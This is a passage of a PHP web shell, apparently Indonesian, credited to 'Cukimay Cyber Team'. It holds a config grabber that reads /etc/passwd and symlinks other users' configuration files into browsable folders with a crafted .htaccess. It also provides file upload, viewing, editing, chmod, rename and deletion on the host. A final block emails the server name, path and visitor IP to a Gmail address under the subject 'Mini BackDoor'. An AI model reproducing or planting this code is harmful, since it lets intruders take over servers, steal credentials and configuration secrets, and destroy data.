$file_config = fopen("niod_configgrab/$user_niod-$nama_config.txt","w");
fputs($file_config,$ambil_config);
}
}
if($_POST['config'] == 'symlink') {
@symlink($config,"niod_Symconfig/".$user_niod."-".$nama_config.".txt");
}
if($_POST['config'] == '404') {
$sym404=symlink($config,"niod_sym404/".$user_niod."-".$nama_config.".txt");
if($sym404){
	@mkdir("niod_sym404/".$user_niod."-".$nama_config.".txt404", 0777);
	$htaccess="Options Indexes FollowSymLinks
DirectoryIndex niod.htm
HeaderName niod.txt
Satisfy Any
IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
IndexIgnore *";

@file_put_contents("niod_sym404/".$user_niod."-".$nama_config.".txt404/.htaccess",$htaccess);

@symlink($config,"niod_sym404/".$user_niod."-".$nama_config.".txt404/niod.txt");

	}

}

                    }     
		}  if($_POST['config'] == 'grab') {
            echo "<center><a href='?path=$path/niod_configgrab'><font color=lime>Done</font></a></center>";
		}
    if($_POST['config'] == '404') {
        echo "<center>
<a href=\"niod_sym404/root/\">SymlinkNya</a>
<br><a href=\"niod_sym404/\">Configurations</a></center>";
    }
     if($_POST['config'] == 'symlink') {
echo "<center>
<a href=\"niod_symconfig/root/\">Symlinknya</a>
<br><a href=\"niod_symconfig/\">Configurations</a></center>";
			}if($_POST['config'] == 'symvhost') {
echo "<center>
<a href=\"niod_symvhost/root/\">Root Server</a>
<br><a href=\"niod_symvhost/\">Configurations</a></center>";
			}
		
		
		}else{
        echo "<form method=\"post\" action=\"\"><center>
		</select><br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
        echo include("/etc/passwd"); 
        echo "</textarea><br><br>
        <select class=\"select\" name=\"config\"  style=\"width: 450px;\" height=\"10\">
        <option value=\"grab\">Config Grab</option>
        <option value=\"symlink\">Symlink Config</option>
		<option value=\"404\">Config 404</option>
		<option value=\"symvhosts\">Vhosts Config Grabber</option><br><br><input type=\"submit\" value=\"Start!!\"></td></tr></center>\n";
}


}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="Upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="red">Change Permission Gagal</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Ganti Nama Berhasil</font><br/>';
}else{
echo '<font color="red">Ganti Nama Gagal</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
Nama Baru : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Crotz" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Berhasil Edit File</font><br/>';
}else{
echo '<font color="red">Gagal Edit File</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Directory Terhapus</font><br/>';
}else{
echo '<font color="red">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">File Terhapus</font><br/>';
}else{
echo '<font color="red">File Gagal Dihapus</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="900" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<br><br><center><font color="#00FFFF"> © 2020 - Cukimay Cyber Team - <b><a href="https://zone-pedia.tk"><font color="Darkred">NiodTech</font></a><br><br></center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
<?php
$ip = getenv("REMOTE_ADDR");
$ken = rand(1, 99999);
$subj98 = " Mini BackDoor |$ken";
$email = "noniod77@gmail.com";
$from = "From: noniod77@gmail.com";
$tot = $_SERVER['REQUEST_URI'];
$kon = $_SERVER['HTTP_HOST'];
$tol = $ip . "";
$msg8873 = "$kon $tot $tol";
mail($email, $subj98, $msg8873, $from); 
?>
